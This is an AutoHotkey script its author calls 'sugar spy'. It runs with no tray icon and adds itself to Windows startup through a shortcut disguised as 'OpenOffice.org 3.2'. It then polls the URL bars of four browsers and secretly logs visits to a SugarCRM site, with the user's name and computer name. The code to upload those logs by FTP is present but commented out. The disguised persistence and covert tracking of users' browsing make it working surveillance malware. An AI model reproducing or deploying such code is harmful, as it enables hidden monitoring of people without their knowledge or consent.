#include FcnLib.ahk
#include Lynx-FcnLib.ahk
#NoTrayIcon

;sugar spy, using GetUrlBar()

;TODO should we do some logging?

;chillax a little while
SleepMinutes(5)
Random, rand, 10000, 40000
Sleep, %rand%

;ensure that the startup shortcut is set so that we don't have to do it manually
target=C:\Dropbox\AHKs\soffice.exe
;workingDir=C:\Dropbox\AHKs\
workingDir=C:\
shortcut=%A_StartMenu%\Programs\Startup\OpenOffice.org 3.2.lnk
FileCreateShortcut, %target%, %shortcut%, %workingDir%

Loop
{
   browserList=firefox,chrome,iexplore,opera
   Loop, parse, browserList, CSV
      checkForSugar(A_LoopField)
      ;%A_LoopField%url := "%%" A_LoopField "##" GetUrlBar(A_LoopField) "##"
   ;debug("notimeout", firefoxUrl, chromeUrl, iexploreUrl, operaUrl)
   ;debug("notimeout", chromeUrl)

   Sleep, 10000
}

checkForSugar(browser)
{
   global lastUrl
   url := GetUrlBar(browser)

   ;if it isn't sugar, ignore it
   if NOT InStr(url, "sugar.mitsi.com")
      return

   ;check if url changed since last time
   if (url == lastUrl)
      return
   lastUrl := url

   ;shorten the url if possible
   ;if RegExMatch(url, "record\=([0-9a-f-]{36})", match)
   if RegExMatch(url, "\?(.*)$", match)
      url := match1

   pc := StringReplace(A_ComputerName, "lynx", "")

   if (A_UserName = "cameron")
      user := "me"
   else if RegExMatch(A_UserName, "^(Brad|Chris|David|Kevin|Ronn|Jason)$")
      user := StringLeft(A_UserName, 1)
   else
      user := A_UserName

   browser := StringLeft(browser, 2)
   browser := StringReplace(browser, "fi", "ff")

   ;debug("saw sugar!!!", url, A_UserName, A_ComputerName, browser)
   text=%url%`n%user%`n%pc%`n%browser%
   timestamp := CurrentTime("hyphenated")
   ExtTimestamp=%timestamp%-%A_TickCount%
   ;file=C:\temp\archive\ss\0x562839.txt
   file=C:\temp\archive\ss\%ExtTimestamp%.txt
   FileCreate(text, file)
   destFile=other/archive/ss/%ExtTimestamp%.txt
   ;SendFtpFile(file, destFile)
   ;FileDelete(file)
}

SendFtpFile(fromPath, toPath)
{
   ;delog("", "started function", A_ThisFunc)
   ;fix the params, if needed
   ;reasonForScript := GetLynxMaintenanceType()

   ;timestamp := CurrentTime("hyphenated")

   ;try to send it back using MS-ftp
   joe := GetLynxPassword("ftp")
   ftpFilename=C:\temp\ftp.txt

ftpfile=
(
open lynx.mitsi.com
AHK
%joe%
put %fromPath% %toPath%
quit
)

   FileCreate(ftpfile, ftpFilename)
   ret:=CmdRet_RunReturn("ftp -s:" . ftpFilename)
   ;delog(ret)
   FileDelete(ftpFilename)

   ;delog("", "finished function", A_ThisFunc)
}

ExitApp
#include Lynx-Update.ahk
